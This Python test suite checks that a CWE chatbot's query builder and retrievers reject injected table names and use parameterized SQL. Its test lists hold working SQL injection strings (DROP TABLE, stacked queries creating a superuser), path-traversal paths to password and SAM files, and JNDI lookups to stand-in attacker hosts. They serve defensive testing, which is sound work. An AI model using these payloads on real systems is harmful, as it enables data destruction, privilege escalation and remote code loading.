"""
SQL Injection Prevention Test Suite for CWE ChatBot.
Tests that the security fixes prevent SQL injection vulnerabilities.

These tests verify that the SecureQueryBuilder and updated retriever classes
properly prevent SQL injection attacks through table name validation and
parameterized queries.
"""

import pytest
import sys
import os
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
import psycopg2

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from retrieval.secure_query_builder import SecureQueryBuilder
from retrieval.dense_retriever import ChatBotDenseRetriever
from retrieval.sparse_retriever import ChatBotSparseRetriever


class TestSecureQueryBuilder:
    """Test the SecureQueryBuilder for SQL injection prevention."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.query_builder = SecureQueryBuilder()
    
    def test_table_name_validation_allows_whitelisted_tables(self):
        """Test that whitelisted table names are allowed."""
        allowed_tables = ["cwe_embeddings", "users", "conversations", "messages"]
        
        for table_name in allowed_tables:
            # Should not raise exception
            validated = self.query_builder.validate_table_name(table_name)
            assert validated == table_name
    
    def test_table_name_validation_rejects_malicious_names(self):
        """Test that malicious table names are rejected."""
        malicious_table_names = [
            "cwe_embeddings'; DROP TABLE users; --",
            "cwe_embeddings UNION SELECT password FROM auth_tokens --",
            "cwe_embeddings/**/UNION/**/SELECT/**/1,2,3,4,5--",
            "cwe_embeddings' OR '1'='1",
            "../../../etc/passwd",
            "${jndi:ldap://malicious.com/exploit}",
            "cwe_embeddings\"; DELETE FROM users WHERE 1=1; --",
            "cwe_embeddings\\'; INSERT INTO users (role) VALUES ('admin'); --",
            "non_existent_table",
            "system_secrets",
            "pg_shadow"  # PostgreSQL system table
        ]
        
        for malicious_name in malicious_table_names:
            with pytest.raises(ValueError, match="Table name not allowed"):
                self.query_builder.validate_table_name(malicious_name)
    
    def test_vector_similarity_query_uses_sql_identifier(self):
        """Test that vector similarity queries use proper SQL identifiers."""
        query = self.query_builder.build_vector_similarity_query("cwe_embeddings")
        
        # Verify it's a SQL composable object (not a plain string)
        assert hasattr(query, 'as_string')
        
        # Test with mock connection to verify SQL structure
        mock_conn = Mock()
        query_string = query.as_string(mock_conn)
        
        # Verify query contains proper structure and placeholders
        assert "SELECT" in query_string
        assert "FROM" in query_string
        assert "embedding" in query_string
        assert "%s" in query_string  # Parameterized queries
        # Should NOT contain .format() placeholders
        assert "{" not in query_string
        assert "}" not in query_string
    
    def test_direct_cwe_lookup_query_secure(self):
        """Test that direct CWE lookup queries are secure."""
        query = self.query_builder.build_direct_cwe_lookup_query("cwe_embeddings")
        
        mock_conn = Mock()
        query_string = query.as_string(mock_conn)
        
        assert "SELECT" in query_string
        assert "WHERE cwe_id = %s" in query_string
        assert "1.0 as confidence_score" in query_string
        # Verify no .format() vulnerabilities
        assert "{" not in query_string
        assert "}" not in query_string
    
    def test_fulltext_search_query_secure(self):
        """Test that fulltext search queries are secure."""
        query = self.query_builder.build_fulltext_search_query("cwe_embeddings")
        
        mock_conn = Mock()
        query_string = query.as_string(mock_conn)
        
        assert "to_tsvector" in query_string
        assert "plainto_tsquery" in query_string
        assert "%s" in query_string
        # Verify no .format() vulnerabilities
        assert "{" not in query_string
        assert "}" not in query_string
    
    def test_malicious_table_name_in_all_queries(self):
        """Test that all query builders reject malicious table names."""
        malicious_name = "cwe_embeddings'; DROP TABLE users; --"
        
        query_methods = [
            self.query_builder.build_vector_similarity_query,
            self.query_builder.build_direct_cwe_lookup_query,
            self.query_builder.build_fulltext_search_query,
            self.query_builder.build_count_query,
            self.query_builder.build_table_exists_query,
            self.query_builder.build_load_cwe_entries_query
        ]
        
        for query_method in query_methods:
            with pytest.raises(ValueError, match="Table name not allowed"):
                query_method(malicious_name)
    
    def test_dynamic_table_whitelist_management(self):
        """Test adding/removing tables from whitelist."""
        test_table = "test_temp_table"
        
        # Initially should be rejected
        with pytest.raises(ValueError):
            self.query_builder.validate_table_name(test_table)
        
        # Add to whitelist
        SecureQueryBuilder.add_allowed_table(test_table)
        
        # Now should be accepted
        validated = self.query_builder.validate_table_name(test_table)
        assert validated == test_table
        
        # Remove from whitelist
        SecureQueryBuilder.remove_allowed_table(test_table)
        
        # Should be rejected again
        with pytest.raises(ValueError):
            self.query_builder.validate_table_name(test_table)


class TestDenseRetrieverSQLInjectionPrevention:
    """Test SQL injection prevention in DenseRetriever."""
    
    @patch('psycopg2.connect')
    @patch('retrieval.dense_retriever.register_vector')
    def test_dense_retriever_table_name_injection_prevention(self, mock_register, mock_connect):
        """Test that DenseRetriever prevents table name injection."""
        # Setup mocks
        mock_conn = Mock()
        mock_connect.return_value = mock_conn
        
        # Create retriever with malicious table name
        pg_config = {"host": "localhost", "port": 5432, "database": "test", "user": "postgres"}
        
        # This should work with valid table name
        retriever = ChatBotDenseRetriever(pg_config)
        assert retriever.table_name == "cwe_embeddings"  # Default safe value
        
        # Test malicious modification of table name (simulates config injection)
        retriever.table_name = "cwe_embeddings'; DROP TABLE users; --"
        
        # Mock embedding service
        with patch.object(retriever.embedding_service, 'embed_query', return_value=[0.1] * 1536):
            # This should raise ValueError due to table name validation
            with pytest.raises(ValueError, match="Table name not allowed"):
                retriever.search("test query", k=5)
    
    @patch('psycopg2.connect')
    @patch('retrieval.dense_retriever.register_vector')
    def test_dense_retriever_direct_lookup_injection_prevention(self, mock_register, mock_connect):
        """Test that direct CWE lookup prevents injection."""
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_conn.cursor.return_value.__enter__.return_value = mock_cursor
        mock_connect.return_value = mock_conn
        
        pg_config = {"host": "localhost", "port": 5432, "database": "test", "user": "postgres"}
        retriever = ChatBotDenseRetriever(pg_config)
        
        # Test malicious table name injection
        retriever.table_name = "cwe_embeddings' OR 1=1 --"
        
        with pytest.raises(ValueError, match="Table name not allowed"):
            retriever.get_by_cwe_id("CWE-79")
    
    @patch('psycopg2.connect')
    @patch('retrieval.dense_retriever.register_vector')
    def test_dense_retriever_parameterized_queries(self, mock_register, mock_connect):
        """Test that DenseRetriever uses parameterized queries correctly."""
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_cursor.fetchall.return_value = []
        mock_conn.cursor.return_value.__enter__.return_value = mock_cursor
        mock_connect.return_value = mock_conn
        
        pg_config = {"host": "localhost", "port": 5432, "database": "test", "user": "postgres"}
        retriever = ChatBotDenseRetriever(pg_config)
        
        # Mock embedding service
        test_embedding = [0.1] * 1536
        with patch.object(retriever.embedding_service, 'embed_query', return_value=test_embedding):
            # Perform search
            retriever.search("test query", k=5)
            
            # Verify cursor.execute was called with proper parameterized query
            mock_cursor.execute.assert_called_once()
            call_args = mock_cursor.execute.call_args
            
            # First argument should be a SQL composable object (not string with .format())
            query_arg = call_args[0][0]
            assert hasattr(query_arg, 'as_string')  # SQL composable
            
            # Second argument should be parameters tuple
            params_arg = call_args[0][1]
            assert isinstance(params_arg, tuple)
            assert len(params_arg) == 5  # embedding, embedding, threshold, embedding, k


class TestSparseRetrieverSQLInjectionPrevention:
    """Test SQL injection prevention in SparseRetriever."""
    
    @patch('psycopg2.connect')
    def test_sparse_retriever_table_name_injection_prevention(self, mock_connect):
        """Test that SparseRetriever prevents table name injection."""
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_cursor.fetchall.return_value = []
        mock_conn.cursor.return_value.__enter__.return_value = mock_cursor
        mock_connect.return_value = mock_conn
        
        pg_config = {"host": "localhost", "port": 5432, "database": "test", "user": "postgres"}
        
        # Patch the _setup_bm25 method to prevent it from running during init
        with patch.object(ChatBotSparseRetriever, '_setup_bm25'):
            retriever = ChatBotSparseRetriever(pg_config)
            
            # Test malicious table name injection
            retriever.table_name = "cwe_embeddings'; DELETE FROM users; --"
            
            # This should raise ValueError when trying to load entries
            with pytest.raises(ValueError, match="Table name not allowed"):
                retriever._load_cwe_entries()
    
    @patch('psycopg2.connect')
    def test_sparse_retriever_load_entries_secure_query(self, mock_connect):
        """Test that loading CWE entries uses secure queries."""
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_cursor.fetchall.return_value = [
            ("CWE-79", "XSS", "Cross-site scripting", "XSS vulnerability text", {})
        ]
        mock_conn.cursor.return_value.__enter__.return_value = mock_cursor
        mock_connect.return_value = mock_conn
        
        pg_config = {"host": "localhost", "port": 5432, "database": "test", "user": "postgres"}
        
        with patch.object(ChatBotSparseRetriever, '_setup_bm25'):
            retriever = ChatBotSparseRetriever(pg_config)
            retriever._load_cwe_entries()
            
            # Verify secure query was used
            mock_cursor.execute.assert_called_once()
            call_args = mock_cursor.execute.call_args
            
            # Should be SQL composable object, not string with .format()
            query_arg = call_args[0][0]
            assert hasattr(query_arg, 'as_string')


class TestComprehensiveInjectionScenarios:
    """Test comprehensive SQL injection attack scenarios."""
    
    def test_encoded_injection_attempts(self):
        """Test various encoding-based injection attempts."""
        query_builder = SecureQueryBuilder()
        
        encoded_attacks = [
            # Hex encoded
            "cwe_embeddings%27%3B%20DROP%20TABLE%20users%3B%20--",
            # URL encoded  
            "cwe_embeddings%3B+DROP+TABLE+users%3B+--",
            # Unicode encoded
            "cwe_embeddings\\u0027\\u003B\\u0020DROP\\u0020TABLE\\u0020users\\u003B\\u0020--",
            # Double encoded
            "%2527%253B%2520DROP%2520TABLE%2520users%253B%2520--",
            # Mixed case evasion
            "CWE_embeddings'; DrOp TaBlE users; --",
        ]
        
        for encoded_attack in encoded_attacks:
            with pytest.raises(ValueError, match="Table name not allowed"):
                query_builder.validate_table_name(encoded_attack)
    
    def test_nosql_injection_attempts(self):
        """Test NoSQL-style injection attempts (should be rejected for PostgreSQL)."""
        query_builder = SecureQueryBuilder()
        
        nosql_attacks = [
            "cwe_embeddings'; db.users.drop(); --",
            "cwe_embeddings\\\"; this.users = null; //",
            "cwe_embeddings'; return true; var x = '",
        ]
        
        for nosql_attack in nosql_attacks:
            with pytest.raises(ValueError, match="Table name not allowed"):
                query_builder.validate_table_name(nosql_attack)
    
    def test_path_traversal_injection_attempts(self):
        """Test path traversal injection attempts."""
        query_builder = SecureQueryBuilder()
        
        path_attacks = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "cwe_embeddings/../../../etc/shadow",
            "cwe_embeddings\\..\\..\\system.ini"
        ]
        
        for path_attack in path_attacks:
            with pytest.raises(ValueError, match="Table name not allowed"):
                query_builder.validate_table_name(path_attack)
    
    def test_ldap_injection_attempts(self):
        """Test LDAP injection attempts."""
        query_builder = SecureQueryBuilder()
        
        ldap_attacks = [
            "${jndi:ldap://malicious.com/exploit}",
            "${jndi:rmi://evil.com:1099/exploit}",
            "cwe_embeddings${jndi:ldap://attacker.com/}"
        ]
        
        for ldap_attack in ldap_attacks:
            with pytest.raises(ValueError, match="Table name not allowed"):
                query_builder.validate_table_name(ldap_attack)
    
    def test_time_based_blind_injection_attempts(self):
        """Test time-based blind SQL injection attempts."""
        query_builder = SecureQueryBuilder()
        
        time_attacks = [
            "cwe_embeddings'; SELECT pg_sleep(10); --",
            "cwe_embeddings'; WAITFOR DELAY '00:00:05'; --",
            "cwe_embeddings' AND (SELECT SLEEP(5))='0",
            "cwe_embeddings'; SELECT BENCHMARK(1000000, MD5('test')); --"
        ]
        
        for time_attack in time_attacks:
            with pytest.raises(ValueError, match="Table name not allowed"):
                query_builder.validate_table_name(time_attack)
    
    def test_stacked_queries_prevention(self):
        """Test prevention of stacked query attacks."""
        query_builder = SecureQueryBuilder()
        
        stacked_attacks = [
            "cwe_embeddings; CREATE USER hacker WITH SUPERUSER;",
            "cwe_embeddings; ALTER TABLE users ADD COLUMN backdoor TEXT;",
            "cwe_embeddings; GRANT ALL ON ALL TABLES IN SCHEMA public TO PUBLIC;",
            "cwe_embeddings; INSERT INTO users (role) VALUES ('admin');"
        ]
        
        for stacked_attack in stacked_attacks:
            with pytest.raises(ValueError, match="Table name not allowed"):
                query_builder.validate_table_name(stacked_attack)


class TestSecurityEventLogging:
    """Test that security events are properly logged."""
    
    def test_malicious_table_access_logged(self):
        """Test that attempts to access malicious tables are logged."""
        query_builder = SecureQueryBuilder()
        
        with patch('retrieval.secure_query_builder.logger') as mock_logger:
            malicious_name = "cwe_embeddings'; DROP TABLE users; --"
            
            try:
                query_builder.validate_table_name(malicious_name)
            except ValueError:
                pass  # Expected
            
            # Verify security event was logged
            mock_logger.warning.assert_called_once()
            call_args = mock_logger.warning.call_args[0][0]
            assert "Attempted access to non-allowed table" in call_args
            assert malicious_name in call_args


if __name__ == "__main__":
    pytest.main([__file__, "-v"])